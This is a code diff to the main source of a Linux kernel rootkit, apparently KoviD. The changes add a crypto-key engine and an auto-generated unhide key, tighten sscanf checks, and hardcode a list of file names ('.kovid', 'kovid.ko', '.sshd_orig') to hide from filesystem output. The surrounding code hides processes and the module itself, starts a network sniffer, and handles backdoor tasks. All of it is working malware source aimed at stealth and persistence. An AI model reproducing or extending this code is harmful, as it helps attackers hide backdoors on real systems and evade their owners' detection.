@@ -25,7 +25,9 @@
 #include <linux/namei.h>
 #include <linux/ctype.h>
 #include <linux/parser.h>
+#include <linux/random.h>
 
+#include "crypto.h"
 #include "lkm.h"
 #include "fs.h"
 #include "version.h"
@@ -71,7 +73,7 @@ static DEFINE_SPINLOCK(elfbits_spin);
 #error "fuuuuuu Support is only for x86-64"
 #endif
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,16,0)
 #pragma message "!! Warning: Unsupported kernel version GOOD LUCK WITH THAT! !!"
 #endif
 
@@ -485,14 +487,14 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 kv_show_all_tasks();
                 break;
             case Opt_hide_task_backdoor:
-                if (sscanf(args[0].from, "%d", &pid))
+                if (sscanf(args[0].from, "%d", &pid) == 1)
                     kv_hide_task_by_pid(pid, 1, CHILDREN);
                 break;
             case Opt_list_hidden_tasks:
                 kv_show_saved_tasks();
                 break;
             case Opt_rename_hidden_task:
-                if (sscanf(args[0].from, "%d", &pid))
+                if (sscanf(args[0].from, "%d", &pid) == 1)
                     kv_rename_task(pid, args[1].from);
                 break;
             case Opt_hide_module:
@@ -502,7 +504,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 {
                     uint64_t val;
                     if ((sscanf(args[0].from, "%llx", &val) == 1) &&
-                            UNHIDEKEY == val) {
+                            auto_unhidekey == val) {
                         kv_unhide_mod();
                     }
                 }
@@ -555,7 +557,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 break;
             case Opt_fetch_base_address:
                 {
-                    if (sscanf(args[0].from, "%d", &pid)) {
+                    if (sscanf(args[0].from, "%d", &pid) == 1) {
                         unsigned long base;
                         char bits[32+1] = {0};
                         base = kv_get_elf_vm_start(pid);
@@ -748,6 +750,15 @@ static int __init kv_init(void) {
     struct kernel_syscalls *kaddr = NULL;
 #endif
 
+    /*
+     * Hide these names from write() fs output
+     */
+    static const char *hide_names[] = {
+        ".kovid", "kovid", "kovid.ko", UUIDGEN ".ko",
+        UUIDGEN ".sh", ".sshd_orig", NULL
+    };
+
+
     /** show current version for when running in debug mode */
     prinfo("version %s\n", KOVID_VERSION);
 
@@ -787,6 +798,10 @@ static int __init kv_init(void) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
 cont:
 #endif
+    /** Init crypto engine */
+    kv_crypto_key_init();
+
+
     tsk_sniff = kv_sock_start_sniff();
     if (!tsk_sniff)
         goto unroll_init;
@@ -801,13 +816,12 @@ cont:
     kv_hide_task_by_pid(tsk_tainted->pid, 0, CHILDREN);
 
     /** hide magic filenames & directories */
-    fs_add_name_ro(kv_hide_str_on_load, 0);
+    fs_add_name_ro(hide_names, 0);
 
     /** hide magic filenames, directories and processes */
     fs_add_name_ro(kv_get_hide_ps_names(), 0);
 
     kv_scan_and_hide();
-
 
 #ifndef DEBUG_RING_BUFFER
     kv_hide_mod();
@@ -838,6 +852,7 @@ leave:
 }
 
 static void __exit kv_cleanup(void) {
+
     sys_deinit();
     kv_pid_cleanup();
 
@@ -859,6 +874,8 @@ static void __exit kv_cleanup(void) {
     }
 
     fs_names_cleanup();
+
+    kv_crypto_deinit();
 
     prinfo("unloaded.\n");
 }
